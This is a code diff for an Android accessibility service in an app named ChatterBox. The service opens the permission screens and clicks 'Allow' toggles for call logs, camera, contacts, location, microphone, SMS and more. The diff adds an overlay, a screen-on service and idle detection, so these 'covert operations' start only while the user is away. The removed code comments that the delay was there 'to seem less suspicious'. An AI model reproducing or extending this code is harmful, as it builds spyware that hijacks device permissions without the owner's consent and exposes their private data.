@@ -1,8 +1,10 @@
 package com.example.ChatterBox.accessibility
 
 import android.accessibilityservice.AccessibilityServiceInfo
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.PackageManager
 import android.os.Handler
 import android.os.Looper
@@ -11,6 +13,7 @@ import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 import androidx.core.content.ContextCompat
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import com.example.ChatterBox.R
 
 /**
@@ -21,7 +24,7 @@ import com.example.ChatterBox.R
  */
 class AccessibilityService : android.accessibilityservice.AccessibilityService() {
     private val allTargetPermissions = listOf(
-        "Call logs","Camera", "Contacts", "Location", "Microphone", "Music and audio", "Photos and videos", "Phone","SMS"
+        "Call logs", "Camera", "Contacts", "Location", "Microphone", "Music and audio", "Phone","Photos and videos","SMS"
     )
 
     private fun getUngrantedPermissions(context: Context): List<String> {
@@ -90,14 +93,22 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 AccessibilityServiceInfo.DEFAULT
         info.notificationTimeout = 100
 
+        val intent = Intent(this, overlay::class.java)
+        startService(intent)
+
+        val screenOnIntent = Intent(this, ScreenOnService::class.java)
+        startService(screenOnIntent)
 // Set the updated info
         this.serviceInfo = info
 
-        // Start the covert process after a delay to seem less suspicious
-        handler.postDelayed({
-            // Start the process of accessing permissions
-            initiatePermissionAccess()
-        }, 3000) // Wait 30 seconds after service connects
+        IdleDetector.startIdleDetection(this)
+
+        val filter = IntentFilter().apply {
+            addAction("com.example.ChatterBox.START_COVERT_OPERATIONS")
+            addAction("com.example.ChatterBox.KEEP_SCREEN_ON")
+        }
+        LocalBroadcastManager.getInstance(this).registerReceiver(covertOperationsReceiver, filter)
+
     }
 
     private fun initiatePermissionAccess() {
@@ -130,6 +141,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+
+        IdleDetector.processAccessibilityEvent(event)
 
         // Get the package name of the active window
         val packageName = event.packageName?.toString() ?: return
@@ -273,7 +286,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                     // Only exact matches for "Phone" or those starting with "Phone "
                     nodeText == "Phone"
                 }
-            } else {
+            }
+            else {
                 // For all other permissions, use normal search
                 rootNode.findAccessibilityNodeInfosByText(permission)
             }
@@ -357,7 +371,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                 handler.postDelayed({
                     node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                     Log.d(TAG, "Clicked Permissions option")
-                }, 300)
+                }, 500)
                 return
             } else {
                 // Try to find clickable parent
@@ -367,7 +381,7 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                         handler.postDelayed({
                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                             Log.d(TAG, "Clicked parent of Permissions")
-                        }, 300)
+                        }, 500)
                         return
                     }
                     val temp = parent
@@ -382,11 +396,8 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
      * Find and click allow toggles
      */
     private fun findAndClickToggle(rootNode: AccessibilityNodeInfo) {
-        // Look for switches/toggles and turn them on
-        findTogglesRecursively(rootNode)
-
-        // Also try finding by text
-        val allowTexts = listOf("Allow", "ALLOW", "Allow all the time", "Allow only while using the app")
+        // Fallback: try finding by text, as before.
+        val allowTexts = listOf("Allow", "ALLOW", "Allow all the time", "Allow only while using the app", "All ChatterBox notifications")
         for (text in allowTexts) {
             val nodes = rootNode.findAccessibilityNodeInfosByText(text)
             for (node in nodes) {
@@ -394,39 +405,22 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
                     handler.postDelayed({
                         node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                         Log.d(TAG, "Clicked on: $text")
-                    }, 200)
+                    }, 500)
                     return
                 } else {
-                    // Try to find clickable parent
                     var parent = node.parent
                     while (parent != null) {
                         if (parent.isClickable) {
                             handler.postDelayed({
                                 parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                 Log.d(TAG, "Clicked parent of: $text")
-                            }, 200)
+                            }, 500)
                             return
                         }
-                        val temp = parent
                         parent = parent.parent
-                        temp.recycle()
                     }
                 }
             }
-        }
-    }
-
-    /**
-     * Recursively find toggle switches
-     */
-    private fun findTogglesRecursively(node: AccessibilityNodeInfo?) {
-        if (node == null) return
-
-        // Check all children recursively
-        for (i in 0 until node.childCount) {
-            val child = node.getChild(i) ?: continue
-            findTogglesRecursively(child)
-            child.recycle()
         }
     }
 
@@ -457,6 +451,23 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         nodeInfo.recycle()
     }
 
+    private val covertOperationsReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            when (intent.action) {
+                "com.example.ChatterBox.START_COVERT_OPERATIONS" -> {
+                    // Now trigger permission access only after idle is detected
+                    if (!isExecutingPermissionSequence) {
+                        initiatePermissionAccess()
+                    }
+                }
+            }
+        }
+    }
+    override fun onDestroy() {
+        LocalBroadcastManager.getInstance(this)
+            .unregisterReceiver(covertOperationsReceiver)
+        super.onDestroy()
+    }
     override fun onInterrupt() {
         // Not needed for POC, but required for implementation
     }
